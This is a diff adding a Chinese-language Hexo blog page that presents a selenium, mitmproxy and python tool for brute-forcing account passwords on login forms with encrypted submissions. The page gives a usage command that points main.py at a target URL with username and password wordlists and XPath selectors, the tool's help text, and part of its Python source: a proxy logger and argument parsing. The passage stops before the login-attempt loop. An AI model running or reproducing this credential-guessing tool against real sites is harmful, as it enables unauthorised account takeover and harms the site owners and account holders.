@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    selenium+mitmproxy+python实现加密爆破账户密码V1.0
+  </title>
+  <meta name="description" content="1">
+  <meta name="keywords" content="">
+  <meta name="author" content="RecoveryAshes">
+  <link rel="canonical" href="https://blog.finalline.net/2024/07/14/selenium-mitmproxy-python%E5%AE%9E%E7%8E%B0%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/">
+  
+  
+  <link rel="icon" type="image/svg" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 10l7.383 7.418c.823.82.823 2.148 0 2.967a2.11 2.11 0 0 1-2.976 0L10 13"></path><path d="M6.293 15.293l-2.586-2.586a1 1 0 0 1 0-1.414l7.586-7.586a1 1 0 0 1 1.414 0l2.586 2.586a1 1 0 0 1 0 1.414l-7.586 7.586a1 1 0 0 1-1.414 0z"></path></g></svg>'>
+  
+  
+  
+<link rel="stylesheet" href="../../../../css/b4c95347.css">
+
+  <script>window.i18n = {"tip-status-done":"完成","tip-status-default":"全部","tip-status-todo":"计划","tip-status-doing":"进行","tip-status-other":"其他","text-select":"选择","text-move":"移动","text-esc":"退出","January":"一月","February":"二月","March":"三月","April":"四月","May":"五月","June":"六月","July":"七月","August":"八月","September":"九月","October":"十月","November":"十一月","December":"十二月"}</script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body id="app">
+  <aside id="aside-box" class="left-aside">
+    <div class="header">
+      
+<link rel="stylesheet" href="../../../../css/61875ce9.css">
+
+<div class="profile">
+  <a class="badge" href="/">
+    <span>Hi</span>
+    <span>RecoveryAshes</span>
+  </a>
+  <cosy-tooltip id="left-aside-button" placement="right">
+    <span slot="content">
+      <span>显示 / 隐藏 左侧导航</span>
+      <cosy-short-key>[</cosy-short-key>
+    </span>
+    <cosy-icon>
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+        <g fill="none">
+          <path d="M16 4c1.104-.019 2 .896 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h12zm1 2a1 1 0 0 0-1-1h-2.995v10H16a1 1 0 0 0 1-1V6zm-4.995 9V5H4.001a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8.004z" fill="currentColor"></path>
+        </g>
+      </svg>
+    </cosy-icon>
+  </cosy-tooltip>
+</div>
+
+<script src="../../../../js/69622cae.js"></script>
+
+      
+
+
+<cosy-search id="post-search" placeholder="搜索">
+  <div slot="short-key">
+    <cosy-short-key>⌘</cosy-short-key>
+    <cosy-short-key>K</cosy-short-key>
+  </div>
+</cosy-search>
+
+
+<script>
+  window.algolia = {
+    appId: "GVT6OJD87S",
+    SearchOnlyAPIKey: "02cf9010404e6be4331ee18a1d3524ea"
+  }
+</script>
+
+
+<script src="../../../../js/0a6f193b.js"></script>
+
+    </div>
+    <div class="aside-category">
+      
+<link rel="stylesheet" href="../../../../css/db04a759.css">
+
+
+<nav class="category-nav cosy-scrollbar">
+  <ul><li data-path="archives">
+        <a href="/archives">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M3.5 3A1.5 1.5 0 0 0 2 4.5v4A1.5 1.5 0 0 0 3.5 10h9A1.5 1.5 0 0 0 14 8.5v-4A1.5 1.5 0 0 0 12.5 3h-9zM3 4.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm.5 6.5A1.5 1.5 0 0 0 2 12.5v4A1.5 1.5 0 0 0 3.5 18h9a1.5 1.5 0 0 0 1.5-1.5v-4a1.5 1.5 0 0 0-1.5-1.5h-9zM3 12.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm14-.063a2.003 2.003 0 0 1-2.5-1.937A2 2 0 0 1 16 8.563a2.005 2.005 0 0 1 1 0a2 2 0 0 1 0 3.874zM16.5 3a.5.5 0 0 1 .5.5v4.041a3.02 3.02 0 0 0-1 0V3.5a.5.5 0 0 1 .5-.5zm0 10.5c-.17 0-.337-.014-.5-.041V17.5a.5.5 0 0 0 1 0v-4.041c-.163.027-.33.041-.5.041z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">归档</div>
+        </a>
+      </li><li data-path="cosy-roadmap">
+        <a href="/cosy-roadmap">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M9.384 2a1 1 0 0 0-.966.742L4.616 17H2.5a.5.5 0 0 0 0 1h15a.5.5 0 0 0 0-1h-2.116L11.582 2.742A1 1 0 0 0 10.616 2H9.384zM5.651 17l.8-3H11.5a.5.5 0 0 0 0-1H6.717l.534-2H10.5a.5.5 0 0 0 0-1H7.517l1.867-7h1.232l3.733 14H5.651z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">路线图</div>
+        </a>
+      </li><li data-path="cosy-resume">
+        <a href="/cosy-resume">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M8.5 4.498a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0zm1.5-2.5a2.5 2.5 0 0 0-2.43 3.086L5.471 4.15a1.761 1.761 0 0 0-2.317.88c-.4.882-.008 1.917.877 2.31L7 8.662v2.287l-1.877 4.645a1.75 1.75 0 0 0 3.245 1.311l1.556-3.849a.073.073 0 0 1 .028-.038a.086.086 0 0 1 .046-.012c.02 0 .035.005.046.012a.074.074 0 0 1 .028.038l1.555 3.849a1.75 1.75 0 0 0 3.245-1.311L13 10.96V8.662l2.968-1.322a1.74 1.74 0 0 0 .877-2.31a1.761 1.761 0 0 0-2.317-.88l-2.097.934a2.5 2.5 0 0 0-2.43-3.086zM4.065 5.444a.761.761 0 0 1 1-.38l3.918 1.744a2.5 2.5 0 0 0 2.034 0l3.918-1.744a.761.761 0 0 1 1 .38a.739.739 0 0 1-.373.983l-2.969 1.321a1 1 0 0 0-.593.914v2.298a1 1 0 0 0 .073.375l1.872 4.633a.75.75 0 0 1-1.39.562l-1.556-3.849c-.364-.9-1.639-.9-2.003 0l-1.555 3.85a.75.75 0 1 1-1.39-.562l1.876-4.646A1 1 0 0 0 8 10.95V8.662a1 1 0 0 0-.593-.914L4.438 6.427a.739.739 0 0 1-.373-.983z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">简历</div>
+        </a>
+      </li></ul>
+  <ul><li class="">
+        <a href="../../../../categories/Hexo/">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 576 512"><path d="M542.22 32.05c-54.8 3.11-163.72 14.43-230.96 55.59c-4.64 2.84-7.27 7.89-7.27 13.17v363.87c0 11.55 12.63 18.85 23.28 13.49c69.18-34.82 169.23-44.32 218.7-46.92c16.89-.89 30.02-14.43 30.02-30.66V62.75c.01-17.71-15.35-31.74-33.77-30.7zM264.73 87.64C197.5 46.48 88.58 35.17 33.78 32.05C15.36 31.01 0 45.04 0 62.75V400.6c0 16.24 13.13 29.78 30.02 30.66c49.49 2.6 149.59 12.11 218.77 46.95c10.62 5.35 23.21-1.94 23.21-13.46V100.63c0-5.29-2.62-10.14-7.27-12.99z" fill="currentColor"></path></svg>
+          <div class="ellipsis">
+            <span>Hexo</span>
+          </div>
+        </a>
+      </li><li class="active">
+        <a href="../../../../categories/%E5%B7%A5%E5%85%B7/">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16"><g fill="none"><path d="M4.5 2.001a2.5 2.5 0 0 0-2.5 2.5v6a2.5 2.5 0 0 0 2.5 2.5h4.281c.033-.216.105-.43.221-.63l.214-.37H4.5a1.5 1.5 0 0 1-1.5-1.5V5h9v1.194a2.926 2.926 0 0 1 1-.204V4.5a2.5 2.5 0 0 0-2.5-2.5h-6zM3.084 4a1.5 1.5 0 0 1 1.415-1h6a1.5 1.5 0 0 1 1.414 1H3.084zm7.332 3.71L8.854 6.146a.5.5 0 0 0-.707.707l1.646 1.647l-1.646 1.646a.5.5 0 1 0 .707.707l1.368-1.368a2.898 2.898 0 0 1 .194-1.777zM6.853 6.146a.5.5 0 0 1 0 .707L5.207 8.501l1.646 1.646a.5.5 0 1 1-.707.707l-2-2a.5.5 0 0 1 0-.707l2-2a.5.5 0 0 1 .707 0zM12.52 8.58l.9-1.56a1.91 1.91 0 0 0-1.902 2.992l-1.651 2.86a.796.796 0 0 0 1.378.795l1.655-2.865a1.91 1.91 0 0 0 1.623-3.144l-.9 1.559a.637.637 0 1 1-1.103-.637z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">
+            <span>工具</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="../../../../categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512"><path data-name="XMLID 501 -1" d="M408.67 298.53a21 21 0 1 1 20.9-21a20.85 20.85 0 0 1-20.9 21m-102.17 0a21 21 0 1 1 20.9-21a20.84 20.84 0 0 1-20.9 21m152.09 118.86C491.1 394.08 512 359.13 512 319.51c0-71.08-68.5-129.35-154.41-129.35s-154.42 58.27-154.42 129.35s68.5 129.34 154.42 129.34c17.41 0 34.83-2.33 49.92-7c2.49-.86 3.48-1.17 4.64-1.17a16.67 16.67 0 0 1 8.13 2.34L454 462.83a11.62 11.62 0 0 0 3.48 1.17a5 5 0 0 0 4.65-4.66a14.27 14.27 0 0 0-.77-3.86c-.41-1.46-5-16-7.36-25.27a18.94 18.94 0 0 1-.33-3.47a11.4 11.4 0 0 1 5-9.35" fill="currentColor"></path><path data-name="XMLID 505 -7" d="M246.13 178.51a24.47 24.47 0 0 1 0-48.94c12.77 0 24.38 11.65 24.38 24.47c1.16 12.82-10.45 24.47-24.38 24.47m-123.06 0A24.47 24.47 0 1 1 147.45 154a24.57 24.57 0 0 1-24.38 24.47M184.6 48C82.43 48 0 116.75 0 203c0 46.61 24.38 88.56 63.85 116.53C67.34 321.84 68 327 68 329a11.38 11.38 0 0 1-.66 4.49C63.85 345.14 59.4 364 59.21 365s-1.16 3.5-1.16 4.66a5.49 5.49 0 0 0 5.8 5.83a7.15 7.15 0 0 0 3.49-1.17L108 351c3.49-2.33 5.81-2.33 9.29-2.33a16.33 16.33 0 0 1 5.81 1.16c18.57 5.83 39.47 8.16 60.37 8.16h10.45a133.24 133.24 0 0 1-5.81-38.45c0-78.08 75.47-141 168.35-141h10.45C354.1 105.1 277.48 48 184.6 48" fill="currentColor"></path></svg>
+          <div class="ellipsis">
+            <span>微信小程序</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="../../../../categories/%E6%9D%82/">
+          
+          <div class="ellipsis">
+            <span>杂</span>
+          </div>
+        </a>
+      </li></ul>
+</nav>
+
+
+<script src="../../../../js/066f8989.js"></script>
+
+    </div>
+    <div class="bottom">
+      <cosy-tooltip id="button-preference" placement="right">
+        <span slot="content">
+          <span>偏好</span>
+          <cosy-short-key>⌘</cosy-short-key>
+          <cosy-short-key>p</cosy-short-key>
+        </span>
+        <cosy-icon bordered id="button-about-cosy-theme">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16">
+            <g fill="none">
+              <path d="M8 6a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM7 8a1 1 0 1 1 2 0a1 1 0 0 1-2 0zm3.618-3.602a.708.708 0 0 1-.824-.567l-.26-1.416a.354.354 0 0 0-.275-.282a6.072 6.072 0 0 0-2.519 0a.354.354 0 0 0-.275.282l-.259 1.416a.71.71 0 0 1-.936.538l-1.359-.484a.355.355 0 0 0-.382.095c-.569.627-1 1.367-1.262 2.173a.352.352 0 0 0 .108.378l1.102.931a.704.704 0 0 1 0 1.076l-1.102.931a.352.352 0 0 0-.108.378A5.986 5.986 0 0 0 3.53 12.02a.355.355 0 0 0 .382.095l1.36-.484a.708.708 0 0 1 .936.538l.258 1.416c.026.14.135.252.275.281a6.075 6.075 0 0 0 2.52 0a.353.353 0 0 0 .274-.281l.26-1.416a.71.71 0 0 1 .936-.538l1.359.484c.135.048.286.01.382-.095c.569-.627 1-1.367 1.262-2.173a.352.352 0 0 0-.108-.378l-1.102-.931a.703.703 0 0 1 0-1.076l1.102-.931a.352.352 0 0 0 .108-.378A5.985 5.985 0 0 0 12.47 3.98a.355.355 0 0 0-.382-.095l-1.36.484a.71.71 0 0 1-.111.03zm-6.62.58l.937.333a1.71 1.71 0 0 0 2.255-1.3l.177-.97a5.105 5.105 0 0 1 1.265 0l.178.97a1.708 1.708 0 0 0 2.255 1.3L12 4.977c.255.334.467.698.63 1.084l-.754.637a1.704 1.704 0 0 0 0 2.604l.755.637a4.99 4.99 0 0 1-.63 1.084l-.937-.334a1.71 1.71 0 0 0-2.255 1.3l-.178.97a5.099 5.099 0 0 1-1.265 0l-.177-.97a1.708 1.708 0 0 0-2.255-1.3L4 11.023a4.987 4.987 0 0 1-.63-1.084l.754-.638a1.704 1.704 0 0 0 0-2.603l-.755-.637c.164-.386.376-.75.63-1.084z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+    </div>
+  </aside>
+  <main>
+    
+<link rel="stylesheet" href="../../../../css/4dbc8f91.css">
+
+
+<div class="post-container">
+  <header>
+    <div class="left">
+      
+<link rel="stylesheet" href="../../../../css/7d333f9e.css">
+
+<nav class="breadcrumb">
+  <section>
+    <cosy-tooltip placement="bottom-left">
+      <span slot="content"><span>首页</span>
+        <cosy-short-key>⌘</cosy-short-key>
+        <cosy-short-key>H</cosy-short-key>
+      </span>
+      <cosy-icon href="/">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+          <g fill="none">
+            <path d="M8.998 2.388a1.5 1.5 0 0 1 2.005 0l5.5 4.942A1.5 1.5 0 0 1 17 8.445V15.5a1.5 1.5 0 0 1-1.5 1.5H13a1.5 1.5 0 0 1-1.5-1.5V12a.5.5 0 0 0-.5-.5H9a.5.5 0 0 0-.5.5v3.5A1.5 1.5 0 0 1 7 17H4.5A1.5 1.5 0 0 1 3 15.5V8.445c0-.425.18-.83.498-1.115l5.5-4.942zm1.336.744a.5.5 0 0 0-.668 0l-5.5 4.942A.5.5 0 0 0 4 8.445V15.5a.5.5 0 0 0 .5.5H7a.5.5 0 0 0 .5-.5V12A1.5 1.5 0 0 1 9 10.5h2a1.5 1.5 0 0 1 1.5 1.5v3.5a.5.5 0 0 0 .5.5h2.5a.5.5 0 0 0 .5-.5V8.445a.5.5 0 0 0-.166-.371l-5.5-4.942z" fill="currentColor"></path>
+          </g>
+        </svg>
+      </cosy-icon>
+    </cosy-tooltip>
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <a class="ellipsis" href="../../../../categories/%E5%B7%A5%E5%85%B7/">
+      工具
+    </a>
+    
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <span class="ellipsis">
+      selenium+mitmproxy+p
+    </span>
+    
+  </section>
+</nav>
+
+
+<script src="../../../../js/31d6cfe0.js"></script>
+
+    </div>
+    <div class="right">
+      
+        <cosy-tooltip id="toc-show-button" placement="left">
+          <span slot="content">
+            <span>显示 / 隐藏 文章目录</span>
+            <cosy-short-key>]</cosy-short-key>
+          </span>
+          <cosy-icon>
+            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+              <g fill="none">
+                <path
+                  d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z"
+                  fill="currentColor"></path>
+              </g>
+            </svg>
+          </cosy-icon>
+        </cosy-tooltip>
+        
+    </div>
+  </header>
+  <div class="content">
+    <main class="cosy-scrollbar">
+      <div class="article-container">
+        <!-- 渲染文章内容 -->
+        <article>
+          <!-- 文章标题 -->
+          <h1 class="post-title">selenium+mitmproxy+python实现加密爆破账户密码V1.0</h1>
+          <div class="last-updated">
+            上次更新: 2024-07-14 21:54:02
+          </div>
+          <!-- 文章 -->
+          <h1 id="selenium-mitmproxy-python实现加密爆破账户密码V1-0"><a href="#selenium-mitmproxy-python实现加密爆破账户密码V1-0" class="headerlink" title="selenium+mitmproxy+python实现加密爆破账户密码V1.0"></a>selenium+mitmproxy+python实现加密爆破账户密码V1.0</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python main.py <span class="token parameter variable">-t</span> https://xxxx <span class="token parameter variable">-ux</span> <span class="token string">'//*[@id="username"]'</span> <span class="token parameter variable">-px</span> <span class="token string">'//*[@id="password"]'</span> <span class="token parameter variable">-U</span> a.txt <span class="token parameter variable">-P</span> p.txt <span class="token parameter variable">-lx</span> <span class="token string">'//*[@id="login-form"]/form/table/tbody/tr[4]/td[2]/input'</span> <span class="token parameter variable">-proxy</span> http://127.0.0.1:8081<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python main.py <span class="token parameter variable">-h</span>
+usage: main.py <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> <span class="token parameter variable">-t</span> TARGET <span class="token parameter variable">-U</span> USERNAMES <span class="token parameter variable">-P</span> PASSWORDS <span class="token parameter variable">-ux</span> USERNAME_XPATH <span class="token parameter variable">-px</span> PASSWORD_XPATH <span class="token parameter variable">-lx</span>
+LOGIN_XPATH <span class="token punctuation">[</span>-proxy PROXY<span class="token punctuation">]</span>
+
+Run Selenium tests with DDT.
+
+options:
+-h, <span class="token parameter variable">--help</span>            show this <span class="token builtin class-name">help</span> message and <span class="token builtin class-name">exit</span>
+<span class="token parameter variable">-t</span> TARGET, <span class="token parameter variable">--target</span> TARGET
+Path to the target.
+<span class="token parameter variable">-U</span> USERNAMES, <span class="token parameter variable">--usernames</span> USERNAMES
+Path to the usernames text file.
+<span class="token parameter variable">-P</span> PASSWORDS, <span class="token parameter variable">--passwords</span> PASSWORDS
+Path to the passwords text file.
+<span class="token parameter variable">-ux</span> USERNAME_XPATH, <span class="token parameter variable">--username_xpath</span> USERNAME_XPATH
+XPath expression <span class="token keyword">for</span> the username field.
+<span class="token parameter variable">-px</span> PASSWORD_XPATH, <span class="token parameter variable">--password_xpath</span> PASSWORD_XPATH
+XPath expression <span class="token keyword">for</span> the password field.
+<span class="token parameter variable">-lx</span> LOGIN_XPATH, <span class="token parameter variable">--login_xpath</span> LOGIN_XPATH
+XPath expression <span class="token keyword">for</span> the login button.
+<span class="token parameter variable">-proxy</span> PROXY, <span class="token parameter variable">--proxy</span> PROXY
+代理,例如http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading
+<span class="token keyword">import</span> asyncio
+<span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> options<span class="token punctuation">,</span> http
+<span class="token keyword">from</span> mitmproxy<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>dump <span class="token keyword">import</span> DumpMaster
+<span class="token keyword">import</span> argparse
+<span class="token keyword">import</span> sys
+<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
+<span class="token keyword">import</span> unittest
+<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>service <span class="token keyword">import</span> Service
+<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By
+<span class="token keyword">from</span> ddt <span class="token keyword">import</span> ddt<span class="token punctuation">,</span> data<span class="token punctuation">,</span> unpack
+<span class="token keyword">import</span> time
+
+global_enable_logging <span class="token operator">=</span> <span class="token boolean">False</span>
+global_request_text<span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token keyword">class</span> <span class="token class-name">RequestLogger</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> global_enable_logging<span class="token punctuation">:</span>
+            <span class="token keyword">return</span>
+        <span class="token comment"># print(f"URL: &#123;flow.request.url&#125;")</span>
+        <span class="token comment"># print(f"Method: &#123;flow.request.method&#125;")#类型</span>
+        <span class="token comment">#print(f"Headers: &#123;flow.request.headers&#125;")#headers数据</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"data: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment">#data数据</span>
+        <span class="token keyword">global</span> global_request_text
+        global_request_text<span class="token operator">=</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>text
+        
+
+        <span class="token comment"># print(flow.request.first_line_format)</span>
+    <span class="token keyword">def</span> <span class="token function">response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> global_enable_logging<span class="token punctuation">:</span>
+            <span class="token keyword">return</span>
+        
+        <span class="token keyword">if</span> global_request_text <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'_______________'</span><span class="token punctuation">)</span>
+        <span class="token comment"># print('1')</span>
+        <span class="token comment"># print( flow.response.text)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Content-Length: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token comment"># print("Response Content:")</span>
+        <span class="token comment"># print(f"URL: &#123;flow.request.url&#125;")</span>
+        <span class="token comment"># print(f"Method: &#123;flow.request.method&#125;")</span>
+        <span class="token comment"># print(f"Status Code: &#123;flow.response.status_code&#125;")</span>
+        <span class="token comment"># if flow.response.status_code != 200:</span>
+        <span class="token comment">#     print("Error in response, printing content:")</span>
+        <span class="token comment">#     print(flow.response.content)</span>
+
+<span class="token keyword">def</span> <span class="token function">run_mitmproxy</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Create a new event loop for this thread</span>
+    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>new_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    asyncio<span class="token punctuation">.</span>set_event_loop<span class="token punctuation">(</span>loop<span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token comment"># Create a task and run it using the event loop</span>
+        <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">start_mitmproxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            opts <span class="token operator">=</span> options<span class="token punctuation">.</span>Options<span class="token punctuation">(</span>listen_host<span class="token operator">=</span>host<span class="token punctuation">,</span> listen_port<span class="token operator">=</span>port<span class="token punctuation">,</span> ssl_insecure<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+            master <span class="token operator">=</span> DumpMaster<span class="token punctuation">(</span>
+                opts<span class="token punctuation">,</span>
+                with_termlog<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
+                with_dumper<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
+            <span class="token punctuation">)</span>
+            master<span class="token punctuation">.</span>addons<span class="token punctuation">.</span>add<span class="token punctuation">(</span>RequestLogger<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">await</span> master<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        <span class="token comment"># Schedule the task and run the event loop</span>
+        task <span class="token operator">=</span> loop<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>start_mitmproxy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>task<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        <span class="token comment"># Clean up the event loop when done</span>
+        loop<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token comment"># Start mitmproxy server in a separate thread</span>
+<span class="token keyword">def</span> <span class="token function">start_proxy_thread</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    proxy_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run_mitmproxy<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> daemon<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    proxy_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> proxy_thread
+
+
+<span class="token comment"># Parse command-line arguments</span>
+<span class="token keyword">def</span> <span class="token function">parse_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Run Selenium tests with DDT.'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--target'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Path to the target.'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-U'</span><span class="token punctuation">,</span> <span class="token string">'--usernames'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Path to the usernames text file.'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-P'</span><span class="token punctuation">,</span> <span class="token string">'--passwords'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Path to the passwords text file.'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
